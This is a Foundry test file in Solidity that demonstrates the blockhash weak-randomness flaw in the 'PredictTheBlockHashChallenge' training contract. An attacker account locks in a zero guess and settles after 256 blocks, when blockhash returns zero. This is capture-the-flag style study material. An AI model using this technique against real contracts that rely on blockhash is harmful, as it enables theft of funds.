
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {
    PredictTheBlockHashChallenge target;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 2 ether);
        target = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 lockBlockNumber, uint256 settleBlockNumber) public {
        vm.assume(lockBlockNumber < type(uint256).max - 258);
        vm.assume(settleBlockNumber > lockBlockNumber + 1);
        vm.assume(settleBlockNumber <= lockBlockNumber + 258);
        
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        
        vm.roll(lockBlockNumber);
        target.lockInGuess{value: 1 ether}(bytes32(0));
        
        vm.roll(settleBlockNumber);
        
        bytes32 answer = blockhash(lockBlockNumber + 1);
        bytes32 expectedGuess = bytes32(0);
        
        if (settleBlockNumber > lockBlockNumber + 256) {
            answer = bytes32(0);
        }
        
        target.settle();
        
        if (expectedGuess == answer) {
            assert(attacker.balance > 0);
        }
    }
}
